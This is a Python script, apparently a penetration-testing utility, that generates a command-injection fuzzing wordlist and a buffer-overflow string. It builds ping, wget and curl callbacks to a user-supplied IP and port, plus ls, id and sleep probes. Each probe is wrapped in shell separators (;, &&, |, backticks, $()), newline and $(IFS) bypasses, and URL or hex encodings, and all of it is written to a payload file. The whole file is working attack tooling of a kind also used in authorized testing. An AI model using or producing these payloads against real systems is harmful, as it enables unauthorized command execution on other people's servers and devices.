import os
import sys

from urllib.parse import quote, unquote

def payload_bof():
    bof_payload = 4096 * 'aa'
    save_file(bof_payload)


def payload_cmdi(ip, port):
    payload_list = []
    # ping
    payload_list.extend(
        ["ping " + ip,
         "busybox ping " + ip,
         "/bin/busybox ping " + ip,
         "/sbin/ping " + ip,
         "/usr/bin/ping " + ip,
         "/usr/sbin/ping " + ip])

    # wget
    payload_list.extend(
        ["wget http://" + ip + ":" + port,
         "busybox wget http://" + ip + ":" + port,
         "/bin/busybox wget http://" + ip + ":" + port,
         "/sbin/wget http://" + ip + ":" + port,
         "/usr/bin/wget http://" + ip + ":" + port,
         "/usr/sbin/wget http://" + ip + ":" + port])

    # curl
    payload_list.extend(
        ["curl http://" + ip + ":" + port,
         "busybox curl http://" + ip + ":" + port,
         "/bin/busybox curl http://" + ip + ":" + port,
         "/sbin/curl http://" + ip + ":" + port,
         "/usr/bin/curl http://" + ip + ":" + port,
         "/usr/sbin/curl http://" + ip + ":" + port])
    # ls
    payload_list.extend(["ls", "/bin/ls"])
    # id
    payload_list.extend(["id"])
    # sleep
    payload_list.extend(["sleep", "busybox sleep", "/bin/busybox sleep"])

    return payload_list


def process_cmdi(payload_list):
    # 原始payload命令
    for i in payload_list:
        save_file(i)
    # 处理payload，加上常见的绕过和命令截断
    for i in payload_list:
        i = "`" + i + "`"
        save_file(i)
        process_cmdi2(i)

    for i in payload_list:
        i = ";" + i
        save_file(i)
        process_cmdi2(i)
    for i in payload_list:
        i = "&&" + i
        save_file(i)
        process_cmdi2(i)
    for i in payload_list:
        i = "|" + i
        save_file(i)
        process_cmdi2(i)
    for i in payload_list:
        i = "||" + i
        save_file(i)
        process_cmdi2(i)
    for i in payload_list:
        i = "\n" + i + "\n"
        process_cmdi2(i)
    for i in payload_list:
        i = "%0A" + quote(i, 'utf-8') + "%0A"
        save_file(i)

    for i in payload_list:
        i = "$({})".format(i)
        save_file(i)
    for i in payload_list:
        i = str(i).replace(" ", "$(IFS)")
        #i = "" + i
        save_file(i)
    for i in payload_list:
        i = "\\n" + i +"\\n"
        save_file(i)
    for i in payload_list:
        i = "%0D" + quote(i, 'utf-8') + "%0D"
        save_file(i)


def process_cmdi2(i):
    ii = quote(i, 'utf-8')
    save_file(ii)
    iii = "$({})".format(i)
    save_file(iii)
    iiii = urlencode(i)
    save_file(iiii)




def save_file(content):
    with open("payload___", "a") as f:
        f.write(str(content) + "\n")


def urlencode(string):
    encode_string = ""
    for char in string:
        encode_char = hex(ord(char)).replace("0x","%")
        encode_string += encode_char
    return encode_string


if __name__== "__main__" :
    if len(sys.argv) < 3:
        print("usage:python3 " + sys.argv[0] + " ip" + " port")
        sys.exit(0)
    ip = sys.argv[1]
    port = sys.argv[2]
    # print(ip,port)
    # print(payload(ip, port))
    process_cmdi(payload_cmdi(ip, port))



    # process_cmdi()
